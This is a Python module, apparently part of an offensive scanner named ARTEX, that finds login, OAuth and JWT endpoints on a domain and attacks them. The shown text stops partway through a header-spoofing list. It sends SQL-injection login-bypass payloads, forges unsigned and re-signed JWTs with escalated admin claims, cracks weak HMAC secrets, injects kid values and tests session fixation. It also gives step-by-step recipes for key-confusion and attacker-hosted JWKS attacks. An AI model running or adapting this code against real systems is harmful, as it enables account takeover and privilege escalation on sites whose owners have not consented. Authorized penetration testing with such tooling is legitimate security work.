from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import threading
import time
import uuid
from copy import deepcopy
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple
from urllib.parse import urlencode, urljoin, urlparse

import requests
from requests import Response, Session

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class BypassTechnique(Enum):
    SQL_INJECTION       = "sqli_login_bypass"
    JWT_ALG_NONE        = "jwt_alg_none"
    JWT_RS256_HS256     = "jwt_rs256_to_hs256"
    JWT_KID_SQLI        = "jwt_kid_sqli"
    JWT_JWK_INJECT      = "jwt_jwk_injection"
    JWT_JKU_INJECT      = "jwt_jku_injection"
    JWT_WEAK_SECRET     = "jwt_weak_secret_bruteforce"
    SESSION_FIXATION    = "session_fixation"
    SESSION_PREDICTION  = "session_prediction"
    COOKIE_MANIPULATION = "cookie_manipulation"
    PASSWORD_RESET_RACE = "password_reset_race"
    TOKEN_LEAK_REFERRER = "token_leak_referrer"
    OAUTH_REDIRECT      = "oauth_open_redirect"
    OAUTH_STATE_CSRF    = "oauth_state_csrf"
    MASS_ASSIGNMENT     = "mass_assignment"
    HTTP_METHOD_TAMPER  = "http_method_tamper"
    HOST_HEADER_INJECT  = "host_header_inject"
    RATE_LIMIT_BYPASS   = "rate_limit_bypass"
    USER_ENUM_TIMING    = "user_enum_timing"
    MFA_BYPASS_CODE     = "mfa_otp_bypass"
    HEADER_SPOOF        = "header_spoof_bypass"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED   = auto()
    LIKELY      = auto()
    POSSIBLE    = auto()
    NOT_VULN    = auto()
    ERROR       = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AuthFinding:
    finding_id:   str
    technique:    BypassTechnique
    severity:     FindingSeverity
    status:       FindingStatus
    target_url:   str
    evidence:     Dict[str, Any]
    payload_used: Optional[str]
    notes:        str
    timestamp:    datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":   self.finding_id,
            "technique":    self.technique.value,
            "severity":     self.severity.name,
            "status":       self.status.name,
            "target_url":   self.target_url,
            "evidence":     self.evidence,
            "payload_used": self.payload_used,
            "notes":        self.notes,
            "timestamp":    self.timestamp.isoformat(),
        }


@dataclass
class AuthTarget:
    url:           str
    login_type:    str           # standard_login | wp-login | oauth | api_jwt | saml
    form_action:   Optional[str]
    csrf_token:    Optional[str]
    user_field:    Optional[str]
    pass_field:    Optional[str]
    extra_fields:  Dict[str, str] = field(default_factory=dict)
    cookies:       Dict[str, str] = field(default_factory=dict)
    headers:       Dict[str, str] = field(default_factory=dict)
    jwt_present:   bool = False
    oauth_params:  Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url":          self.url,
            "login_type":   self.login_type,
            "form_action":  self.form_action,
            "csrf_token":   self.csrf_token,
            "user_field":   self.user_field,
            "pass_field":   self.pass_field,
            "extra_fields": self.extra_fields,
            "jwt_present":  self.jwt_present,
            "oauth_params": self.oauth_params,
        }


@dataclass
class BypassResult:
    run_id:       str
    domain:       str
    targets:      List[Dict[str, Any]]
    findings:     List[Dict[str, Any]]
    score:        float
    risk_level:   str
    techniques_tested: List[str]
    started_at:   datetime
    finished_at:  datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":            self.run_id,
            "domain":            self.domain,
            "targets_found":     len(self.targets),
            "targets":           self.targets,
            "findings":          self.findings,
            "score":             round(self.score, 2),
            "risk_level":        self.risk_level,
            "techniques_tested": self.techniques_tested,
            "started_at":        self.started_at.isoformat(),
            "finished_at":       self.finished_at.isoformat(),
            "duration_s":        round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP session wrapper — reuses HTTPClient conventions from core/
# ─────────────────────────────────────────────────────────────────────────────

class _SessionPool:
    """
    Per-thread requests.Session pool with configurable UA rotation,
    rate-limiting, and TLS verification toggle.
    Mirrors HTTPClient in core/http_client.py but adds POST/cookie/header
    primitives needed for auth probe work.
    """

    _USER_AGENTS: List[str] = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    ]

    def __init__(
        self,
        request_delay: float = 0.5,
        timeout:        float = 8.0,
        verify_tls:     bool  = False,
        max_redirects:  int   = 5,
    ):
        self._delay       = request_delay
        self._timeout     = timeout
        self._verify      = verify_tls
        self._max_redir   = max_redirects
        self._local       = threading.local()
        self._last_req    = threading.local()

    # ── session ───────────────────────────────────────────────────────────

    def _session(self) -> Session:
        if not hasattr(self._local, "session"):
            s = requests.Session()
            s.headers.update({"User-Agent": self._ua()})
            s.verify = self._verify
            s.max_redirects = self._max_redir
            self._local.session = s
        return self._local.session

    @classmethod
    def _ua(cls) -> str:
        import random
        return random.choice(cls._USER_AGENTS)

    # ── rate-limit ────────────────────────────────────────────────────────

    def _throttle(self) -> None:
        last = getattr(self._last_req, "ts", 0.0)
        gap  = time.time() - last
        if gap < self._delay:
            time.sleep(self._delay - gap)
        self._last_req.ts = time.time()

    # ── request primitives ────────────────────────────────────────────────

    def get(
        self,
        url:     str,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
        **kwargs,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._session().get(
                url, headers=headers or {}, cookies=cookies or {},
                timeout=self._timeout,
                allow_redirects=allow_redirects,
                **kwargs,
            )
        except requests.RequestException as exc:
            logger.debug("GET %s failed: %s", url, exc)
            return None

    def post(
        self,
        url:     str,
        data:    Optional[Dict[str, Any]] = None,
        json:    Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
        **kwargs,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._session().post(
                url, data=data, json=json,
                headers=headers or {}, cookies=cookies or {},
                timeout=self._timeout,
                allow_redirects=allow_redirects,
                **kwargs,
            )
        except requests.RequestException as exc:
            logger.debug("POST %s failed: %s", url, exc)
            return None

    def head(self, url: str, **kwargs) -> Optional[Response]:
        self._throttle()
        try:
            return self._session().head(url, timeout=self._timeout, **kwargs)
        except requests.RequestException:
            return None

    def reset_session(self) -> None:
        """Drop cookies/state, get a clean session for next target."""
        if hasattr(self._local, "session"):
            self._local.session.close()
            del self._local.session


# ─────────────────────────────────────────────────────────────────────────────
# Auth surface discoverer — reads existing scan_results instead of re-scanning
# ─────────────────────────────────────────────────────────────────────────────

class AuthSurfaceDiscoverer:
    """
    Builds a list of AuthTarget objects by reading what ARTEX already
    collected: email_enumeration (AuthPageScanner output), tech_detection,
    and subdomain list.  Does NOT re-scan; resolves the live page once
    per target to extract form fields, CSRF token, and cookies.
    """

    _FIELD_USER_HINTS = {"username", "user", "email", "login", "uname", "userid", "account"}
    _FIELD_PASS_HINTS = {"password", "pass", "passwd", "pwd", "secret"}

    def __init__(self, http: _SessionPool):
        self._http = http

    # ── public ────────────────────────────────────────────────────────────

    def discover(self, scan_results: Dict[str, Any]) -> List[AuthTarget]:
        targets: List[AuthTarget] = []

        # source 1 — enumeration module output
        email_enum = scan_results.get("email_enumeration", {})
        for page in email_enum.get("login_pages", []):
            url = page.get("url", "")
            if url:
                t = self._resolve_target(url, page.get("type", "standard_login"))
                if t:
                    targets.append(t)

        # source 2 — active subdomains that look like auth surfaces
        for sub in scan_results.get("subdomains", []):
            if not (sub.get("http_status") or sub.get("https_status")):
                continue
            base = (
                f"https://{sub['subdomain']}"
                if sub.get("https_status")
                else f"http://{sub['subdomain']}"
            )
            for path in ("/login", "/admin", "/signin", "/auth", "/wp-login.php"):
                url = base + path
                t   = self._resolve_target(url, "standard_login")
                if t:
                    targets.append(t)
                    break   # one auth surface per subdomain is enough

        # source 3 — tech-detected OAuth/JWT endpoints
        for url, tech_data in scan_results.get("tech_detection", {}).items():
            techs = [
                (t.get("name", "") if isinstance(t, dict) else str(t)).lower()
                for cat_items in tech_data.get("detected", {}).values()
                for t in (cat_items if isinstance(cat_items, list) else [cat_items])
            ]
            if any("oauth" in t or "auth0" in t or "okta" in t for t in techs):
                t = self._resolve_target(url, "oauth")
                if t:
                    targets.append(t)
            if any("jwt" in t for t in techs):
                t = self._resolve_target(url, "api_jwt")
                if t:
                    targets.append(t)

        return self._deduplicate(targets)

    # ── internals ─────────────────────────────────────────────────────────

    def _resolve_target(self, url: str, login_type: str) -> Optional[AuthTarget]:
        resp = self._http.get(url, allow_redirects=True)
        if not resp or resp.status_code not in (200, 301, 302, 403):
            return None

        target = AuthTarget(
            url        = url,
            login_type = login_type,
            form_action = None,
            csrf_token  = None,
            user_field  = None,
            pass_field  = None,
            cookies     = dict(resp.cookies),
            headers     = dict(resp.headers),
        )

        # JWT detection — look for Authorization header pattern or Bearer in body
        if "authorization" in {k.lower() for k in resp.headers}:
            target.jwt_present = True
        if resp.text and re.search(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.', resp.text):
            target.jwt_present = True

        # OAuth param detection
        if resp.url != url:  # followed redirect
            parsed = urlparse(resp.url)
            qs     = dict(p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
            if "state" in qs or "code" in qs or "client_id" in qs:
                target.login_type  = "oauth"
                target.oauth_params = qs

        # Form parsing
        if resp.text:
            self._parse_form(resp.text, resp.url, target)

        return target

    def _parse_form(self, html: str, base_url: str, target: AuthTarget) -> None:
        # Minimal parser without bs4 dependency — regex-based for speed
        form_match = re.search(
            r'<form[^>]*action=["\']?([^"\'>\s]+)["\']?[^>]*>(.*?)</form>',
            html, re.IGNORECASE | re.DOTALL,
        )
        if form_match:
            raw_action     = form_match.group(1)
            target.form_action = urljoin(base_url, raw_action)
            form_body      = form_match.group(2)

            for inp in re.finditer(
                r'<input[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*value=["\']?([^"\'>\s]*)["\']?',
                form_body, re.IGNORECASE,
            ):
                name  = inp.group(1).lower()
                value = inp.group(2)
                if any(h in name for h in self._FIELD_USER_HINTS):
                    target.user_field = inp.group(1)
                elif any(h in name for h in self._FIELD_PASS_HINTS):
                    target.pass_field = inp.group(1)
                elif "csrf" in name or "token" in name or "nonce" in name:
                    target.csrf_token  = value
                    target.extra_fields[inp.group(1)] = value
                else:
                    target.extra_fields[inp.group(1)] = value

    @staticmethod
    def _deduplicate(targets: List[AuthTarget]) -> List[AuthTarget]:
        seen: Set[str] = set()
        out:  List[AuthTarget] = []
        for t in targets:
            key = t.url.rstrip("/")
            if key not in seen:
                seen.add(key)
                out.append(t)
        return out
        
        
# ─────────────────────────────────────────────────────────────────────────────
# Bypass technique modules
# ─────────────────────────────────────────────────────────────────────────────

class _SQLiLoginProbe:
    """
    Classic login-form SQL injection bypass.
    Tests both username and password fields with tautology, comment,
    SLEEP-based blind, and UNION payloads against the form action URL.
    """

    _PAYLOADS: List[Tuple[str, str]] = [
        # (username_payload, password_payload)
        ("admin'--",         "anything"),
        ("' OR '1'='1'--",   "x"),
        ("' OR 1=1--",       "x"),
        ("admin'/*",         "x"),
        ("' OR 'x'='x",      "' OR 'x'='x"),
        ("\" OR \"1\"=\"1",  "x"),
        ("admin' #",         "x"),
        ("' OR 1=1#",        "x"),
        ("') OR ('1'='1",    "x"),
        ("' OR 1=1 LIMIT 1--", "x"),
    ]

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(self, target: AuthTarget) -> List[AuthFinding]:
        findings: List[AuthFinding] = []
        if not target.form_action:
            return findings
        if not target.user_field or not target.pass_field:
            return findings

        # fetch baseline — failed login response signature
        baseline_resp = self._http.post(
            target.form_action,
            data={
                target.user_field:  "invalid_user_xyzzy",
                target.pass_field:  "invalid_pass_xyzzy",
                **target.extra_fields,
            },
            cookies=target.cookies,
        )
        if not baseline_resp:
            return findings
        baseline_len  = len(baseline_resp.text)
        baseline_code = baseline_resp.status_code

        for u_payload, p_payload in self._PAYLOADS:
            data = {
                target.user_field:  u_payload,
                target.pass_field:  p_payload,
                **target.extra_fields,
            }
            resp = self._http.post(
                target.form_action,
                data=data,
                cookies=target.cookies,
                allow_redirects=True,
            )
            if not resp:
                continue

            hit, evidence = self._evaluate(resp, baseline_code, baseline_len)
            if hit:
                findings.append(AuthFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = BypassTechnique.SQL_INJECTION,
                    severity     = FindingSeverity.CRITICAL,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = target.form_action,
                    evidence     = evidence,
                    payload_used = f"user={u_payload!r} pass={p_payload!r}",
                    notes        = "Login form returned success indicators with SQLi payload",
                ))
                break   # first confirmed hit is enough

        return findings

    @staticmethod
    def _evaluate(
        resp:          Response,
        baseline_code: int,
        baseline_len:  int,
    ) -> Tuple[bool, Dict[str, Any]]:
        """
        Heuristics for 'login succeeded':
          1. Redirect to non-login URL (302 + Location not containing /login)
          2. Response body contains dashboard keywords
          3. Set-Cookie with session token appeared
          4. Status changed from 200→302 vs baseline
        """
        evidence: Dict[str, Any] = {
            "status_code":    resp.status_code,
            "response_len":   len(resp.text),
            "redirect_url":   resp.url,
            "baseline_code":  baseline_code,
            "baseline_len":   baseline_len,
        }

        # 302 redirect away from login page
        if resp.history and resp.status_code == 200:
            loc = resp.history[-1].headers.get("Location", "")
            if loc and not any(kw in loc.lower() for kw in ("login", "signin", "error", "failed")):
                evidence["trigger"] = f"redirect_to={loc}"
                return True, evidence

        # dashboard keywords in body
        body_low = resp.text.lower()
        success_kw = ("dashboard", "welcome", "logout", "profile", "admin panel",
                      "my account", "sign out", "log out", "settings")
        for kw in success_kw:
            if kw in body_low:
                evidence["trigger"] = f"keyword={kw!r}"
                return True, evidence

        # session cookie appeared
        for ck in resp.cookies:
            if any(hint in ck.name.lower() for hint in ("session", "auth", "token", "user")):
                evidence["trigger"] = f"new_cookie={ck.name}"
                return True, evidence

        return False, evidence


class _JWTAnalyzer:
    """
    Extracts JWTs from scan data and tests structural attacks:
    alg=none, RS256→HS256 confusion, kid SQLi, JWK injection, JKU injection,
    and weak-secret brute-force (common wordlist).

    Does NOT send probes itself — attack surface is the token structure.
    Reads from: scan_results['payload_analysis']['payloads']['jwt']
                and any JWT found in header_analysis/email_enumeration.
    """

    _WEAK_SECRETS: List[str] = [
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "supersecret", "mysecret", "qwerty", "letmein", "changeme",
        "your-256-bit-secret", "jwt", "token", "auth", "secret123",
    ]

    def __init__(self, http: _SessionPool):
        self._http = http

    # ── public ────────────────────────────────────────────────────────────

    def analyze(
        self,
        scan_results: Dict[str, Any],
        targets: List[AuthTarget],
    ) -> List[AuthFinding]:
        findings: List[AuthFinding] = []

        raw_tokens = self._collect_tokens(scan_results, targets)
        if not raw_tokens:
            # still report structural attack vectors even without a live token
            findings.extend(self._report_structural_vectors(targets))
            return findings

        for token_str, source_url in raw_tokens:
            header, payload_data, sig = self._decode_jwt(token_str)
            if not header:
                continue

            findings.extend(self._test_alg_none(token_str, header, payload_data, source_url))
            findings.extend(self._test_rs256_hs256(token_str, header, payload_data, source_url))
            findings.extend(self._test_kid_sqli(token_str, header, payload_data, source_url))
            findings.extend(self._test_jwk_inject(token_str, header, payload_data, source_url))
            findings.extend(self._test_jku_inject(token_str, header, payload_data, source_url))
            findings.extend(self._test_weak_secret(token_str, sig, header, payload_data, source_url))

        return findings

    # ── token collection ──────────────────────────────────────────────────

    def _collect_tokens(
        self,
        scan_results: Dict[str, Any],
        targets: List[AuthTarget],
    ) -> List[Tuple[str, str]]:
        """Returns list of (raw_jwt_string, source_url)."""
        collected: List[Tuple[str, str]] = []
        pattern = re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*')

        # from payload_analysis
        pa = scan_results.get("payload_analysis", {})
        for jwt_str in pa.get("payloads", {}).get("jwt", {}).values():
            if isinstance(jwt_str, str) and pattern.match(jwt_str.split("\n")[0]):
                collected.append((jwt_str.split("\n")[0], "payload_analysis"))

        # from target cookies / response bodies
        for target in targets:
            for ck_name, ck_val in target.cookies.items():
                if pattern.match(ck_val):
                    collected.append((ck_val, target.url))
            for hdr_val in target.headers.values():
                if isinstance(hdr_val, str):
                    for m in pattern.finditer(hdr_val):
                        collected.append((m.group(), target.url))

        # deduplicate by token string
        seen: Set[str] = set()
        out:  List[Tuple[str, str]] = []
        for tok, src in collected:
            if tok not in seen:
                seen.add(tok)
                out.append((tok, src))
        return out

    # ── JWT decode helper ─────────────────────────────────────────────────

    @staticmethod
    def _decode_jwt(token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[bytes]]:
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None, None, None
            pad = lambda s: s + "=" * (-len(s) % 4)
            header  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
            payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            sig     = base64.urlsafe_b64decode(pad(parts[2]))
            return header, payload, sig
        except Exception:
            return None, None, None

    @staticmethod
    def _encode_jwt_unsigned(header: Dict, payload: Dict) -> str:
        def b64(d: Dict) -> str:
            return base64.urlsafe_b64encode(
                json.dumps(d, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
        return f"{b64(header)}.{b64(payload)}."

    @staticmethod
    def _encode_jwt_hs256(header: Dict, payload: Dict, secret: str) -> str:
        def b64(d: Dict) -> str:
            return base64.urlsafe_b64encode(
                json.dumps(d, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
        h_enc = b64(header)
        p_enc = b64(payload)
        signing_input = f"{h_enc}.{p_enc}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        sig_enc = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{h_enc}.{p_enc}.{sig_enc}"

    # ── attack tests ──────────────────────────────────────────────────────

    def _test_alg_none(
        self,
        original:   str,
        header:     Dict,
        payload_d:  Dict,
        source_url: str,
    ) -> List[AuthFinding]:
        findings: List[AuthFinding] = []
        alg = header.get("alg", "").upper()
        if alg == "NONE":
            return findings   # already none — flag as pre-existing

        for variant in ("none", "None", "NONE", "nOnE", "NoNe"):
            forged_header  = {**header, "alg": variant}
            # escalate claims — try adding admin role
            forged_payload = {**payload_d}
            for role_key in ("role", "roles", "admin", "is_admin", "scope"):
                if role_key in forged_payload:
                    forged_payload[role_key] = (
                        "admin" if isinstance(forged_payload[role_key], str)
                        else True
                    )
            forged_token = self._encode_jwt_unsigned(forged_header, forged_payload)
            findings.append(AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.JWT_ALG_NONE,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.LIKELY,
                target_url   = source_url,
                evidence     = {
                    "original_alg":  alg,
                    "forged_alg":    variant,
                    "forged_token":  forged_token,
                    "original_claims": payload_d,
                    "forged_claims":   forged_payload,
                },
                payload_used = forged_token,
                notes        = (
                    f"alg={variant!r} unsigned token forged with escalated claims. "
                    f"Send as Authorization: Bearer {forged_token[:60]}..."
                ),
            ))

        return findings[:1]   # return first variant only — they're structurally identical

    def _test_rs256_hs256(
        self,
        original:   str,
        header:     Dict,
        payload_d:  Dict,
        source_url: str,
    ) -> List[AuthFinding]:
        if header.get("alg", "").upper() != "RS256":
            return []

        # We can't do the actual re-sign without the server's public key,
        # but we flag the surface and include the recipe.
        return [AuthFinding(
            finding_id   = str(uuid.uuid4()),
            technique    = BypassTechnique.JWT_RS256_HS256,
            severity     = FindingSeverity.HIGH,
            status       = FindingStatus.POSSIBLE,
            target_url   = source_url,
            evidence     = {
                "detected_alg": "RS256",
                "attack":       "algorithm_confusion",
                "recipe": (
                    "1. Grab server RS256 public key from /jwks.json or cert endpoint.\n"
                    "2. Re-sign token using HS256 with the PEM public key bytes as secret:\n"
                    "   import jwt; fake = jwt.encode(payload, pub_key_pem, algorithm='HS256')\n"
                    "3. Send forged token — server may verify with public key as HMAC secret."
                ),
                "original_header":  header,
                "original_payload": payload_d,
            },
            payload_used = None,
            notes        = "RS256→HS256 algorithm confusion attack surface detected.",
        )]

    def _test_kid_sqli(
        self,
        original:   str,
        header:     Dict,
        payload_d:  Dict,
        source_url: str,
    ) -> List[AuthFinding]:
        findings: List[AuthFinding] = []
        if "kid" not in header:
            return findings

        for kid_payload in (
            "' UNION SELECT 'attacker_secret'-- -",
            "../../dev/null",
            "/dev/null",
            "' OR '1'='1",
        ):
            forged_header = {**header, "kid": kid_payload}
            forged_token  = self._encode_jwt_hs256(forged_header, payload_d, "attacker_secret")
            findings.append(AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.JWT_KID_SQLI,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.LIKELY,
                target_url   = source_url,
                evidence     = {
                    "original_kid": header["kid"],
                    "injected_kid": kid_payload,
                    "forged_token": forged_token,
                },
                payload_used = forged_token,
                notes        = (
                    "kid header injected with SQLi to force HMAC key to 'attacker_secret'. "
                    "Token signed with same secret."
                ),
            ))

        return findings[:2]

    def _test_jwk_inject(
        self,
        original:   str,
        header:     Dict,
        payload_d:  Dict,
        source_url: str,
    ) -> List[AuthFinding]:
        if "jwk" in header:
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.JWT_JWK_INJECT,
                severity     = FindingSeverity.CRITICAL,
                status       = FindingStatus.LIKELY,
                target_url   = source_url,
                evidence     = {"existing_jwk": header["jwk"], "header": header},
                payload_used = None,
                notes        = (
                    "jwk claim already present in header. "
                    "Replace with attacker-controlled RSA key, re-sign token."
                ),
            )]
        return []

    def _test_jku_inject(
        self,
        original:   str,
        header:     Dict,
        payload_d:  Dict,
        source_url: str,
    ) -> List[AuthFinding]:
        if "jku" not in header and "x5u" not in header:
            return []
        key = "jku" if "jku" in header else "x5u"
        return [AuthFinding(
            finding_id   = str(uuid.uuid4()),
            technique    = BypassTechnique.JWT_JKU_INJECT,
            severity     = FindingSeverity.CRITICAL,
            status       = FindingStatus.LIKELY,
            target_url   = source_url,
            evidence     = {
                "header_key": key,
                "current_url": header[key],
                "attack": (
                    "Host a JWKS at attacker.com/jwks.json with attacker RSA key. "
                    "Forge token with jku pointing to that URL, sign with matching private key."
                ),
            },
            payload_used = None,
            notes        = f"{key} redirect — forge JWKS + re-sign.",
        )]

    def _test_weak_secret(
        self,
        original:   str,
        sig:        Optional[bytes],
        header:     Dict,
        payload_d:  Dict,
        source_url: str,
    ) -> List[AuthFinding]:
        if header.get("alg", "").upper() not in ("HS256", "HS384", "HS512"):
            return []
        if sig is None:
            return []

        parts = original.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_fn = alg_map.get(header["alg"].upper(), hashlib.sha256)

        for secret in self._WEAK_SECRETS:
            expected_sig = hmac.new(
                secret.encode(), signing_input, hash_fn
            ).digest()
            if hmac.compare_digest(expected_sig, sig):
                forged_payload = {**payload_d}
                for rk in ("role", "is_admin", "admin"):
                    if rk in forged_payload:
                        forged_payload[rk] = "admin" if isinstance(forged_payload[rk], str) else True
                forged_token = self._encode_jwt_hs256(header, forged_payload, secret)
                return [AuthFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = BypassTechnique.JWT_WEAK_SECRET,
                    severity     = FindingSeverity.CRITICAL,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = source_url,
                    evidence     = {
                        "cracked_secret": secret,
                        "forged_token":   forged_token,
                        "escalated_claims": forged_payload,
                    },
                    payload_used = forged_token,
                    notes        = (
                        f"HMAC secret cracked: {secret!r}. "
                        f"Forged token with escalated claims signed with same secret."
                    ),
                )]

        return []

    def _report_structural_vectors(self, targets: List[AuthTarget]) -> List[AuthFinding]:
        """When no live token found, report JWT attack surface for jwt_present targets."""
        findings: List[AuthFinding] = []
        for t in targets:
            if t.jwt_present:
                for tech, sev, note in (
                    (BypassTechnique.JWT_ALG_NONE,    FindingSeverity.CRITICAL, "alg:none bypass possible"),
                    (BypassTechnique.JWT_WEAK_SECRET, FindingSeverity.HIGH,     "weak secret wordlist"),
                    (BypassTechnique.JWT_JWK_INJECT,  FindingSeverity.CRITICAL, "jwk self-embed surface"),
                ):
                    findings.append(AuthFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = tech,
                        severity     = sev,
                        status       = FindingStatus.POSSIBLE,
                        target_url   = t.url,
                        evidence     = {"jwt_detected_in": "headers_or_body"},
                        payload_used = None,
                        notes        = note,
                    ))
        return findings


class _SessionAttackProbe:
    """
    Session fixation, session prediction, and cookie manipulation probes.
    Works against any target with Set-Cookie behaviour.
    """

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(self, target: AuthTarget) -> List[AuthFinding]:
        findings: List[AuthFinding] = []
        findings.extend(self._test_fixation(target))
        findings.extend(self._test_prediction(target))
        findings.extend(self._test_cookie_flags(target))
        return findings

    def _test_fixation(self, target: AuthTarget) -> List[AuthFinding]:
        """
        Session fixation: set a known session ID before auth, check if server
        accepts it post-auth. Classic pattern — send Set-Cookie in request,
        observe whether the same value is returned after auth response.
        """
        fixed_id = f"ARTEX_FIXED_{uuid.uuid4().hex[:12]}"
        cookie_names = [
            ck for ck in target.cookies
            if any(h in ck.lower() for h in ("session", "sess", "sid", "ssid"))
        ]
        if not cookie_names:
            return []

        ck_name = cookie_names[0]
        injected_cookies = {**target.cookies, ck_name: fixed_id}

        resp = self._http.get(target.url, cookies=injected_cookies)
        if not resp:
            return []

        returned_val = resp.cookies.get(ck_name)
        if returned_val == fixed_id:
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.SESSION_FIXATION,
                severity     = FindingSeverity.HIGH,
                status       = FindingStatus.CONFIRMED,
                target_url   = target.url,
                evidence     = {
                    "cookie_name": ck_name,
                    "fixed_value": fixed_id,
                    "server_returned_same": True,
                },
                payload_used = f"{ck_name}={fixed_id}",
                notes        = (
                    "Server accepts and reflects attacker-supplied session ID. "
                    "Pre-auth fixation: set victim session to known value before they log in."
                ),
            )]

        return []

    def _test_prediction(self, target: AuthTarget) -> List[AuthFinding]:
        """
        Collect multiple session IDs and assess entropy.
        Low entropy or sequential IDs indicate predictability.
        """
        ids: List[str] = []
        for _ in range(5):
            self._http.reset_session()
            r = self._http.get(target.url)
            if r:
                for ck in r.cookies:
                    if any(h in ck.name.lower() for h in ("session", "sess", "sid")):
                        ids.append(ck.value)
            time.sleep(0.2)

        if len(ids) < 3:
            return []

        # Shannon entropy estimate
        entropy = self._shannon_entropy("".join(ids))
        if entropy < 3.5:
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.SESSION_PREDICTION,
                severity     = FindingSeverity.HIGH,
                status       = FindingStatus.LIKELY,
                target_url   = target.url,
                evidence     = {
                    "sample_ids":     ids,
                    "entropy_bits":   round(entropy, 3),
                    "entropy_threshold": 3.5,
                },
                payload_used = None,
                notes        = (
                    f"Session ID entropy {entropy:.2f} bits below threshold. "
                    f"IDs may be predictable. Sample: {ids[:3]}"
                ),
            )]

        return []

    def _test_cookie_flags(self, target: AuthTarget) -> List[AuthFinding]:
        findings: List[AuthFinding] = []
        resp = self._http.get(target.url)
        if not resp:
            return findings

        for ck in resp.cookies:
            if not any(h in ck.name.lower() for h in ("session", "auth", "token", "user")):
                continue
            issues: List[str] = []
            if not ck.secure:
                issues.append("Secure flag absent — transmittable over HTTP")
            if not ck.has_nonstandard_attr("HttpOnly"):
                issues.append("HttpOnly absent — accessible via JS / XSS")
            if ck.domain and ck.domain.startswith("."):
                issues.append(f"Broad domain scope: {ck.domain}")
            if issues:
                findings.append(AuthFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = BypassTechnique.COOKIE_MANIPULATION,
                    severity     = FindingSeverity.MEDIUM,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = target.url,
                    evidence     = {"cookie": ck.name, "issues": issues},
                    payload_used = None,
                    notes        = "; ".join(issues),
                ))

        return findings

    @staticmethod
    def _shannon_entropy(s: str) -> float:
        from collections import Counter
        import math
        if not s:
            return 0.0
        counts  = Counter(s)
        total   = len(s)
        return -sum((c / total) * math.log2(c / total) for c in counts.values())


class _HeaderSpoofProbe:
    """
    Header-based auth bypass: X-Forwarded-For, X-Original-IP, X-Custom-IP-Authorization,
    X-Forward-For, X-Remote-IP, X-Client-IP — common in misconfigured reverse proxies
    that trust these headers to bypass IP-based access controls.
    Also tests HTTP method override (X-HTTP-Method-Override: DELETE on a GET endpoint).
    """

    _SPOOF_HEADERS: List[Dict[str, str]] = [
        {"X-Forwarded-For":          "127.0.0.1"},
        {"X-Forwarded-For":          "::1"},
        {"X-Original-IP":            "127.0.0.1"},
        {"X-Remote-IP":              "127.0.0.1"},
        {"X-Client-IP":              "127.0.0.1"},
        {"X-Custom-IP-Authorization":"127.0.0.1"},
        {"X-Real-IP":                "127.0.0.1"},
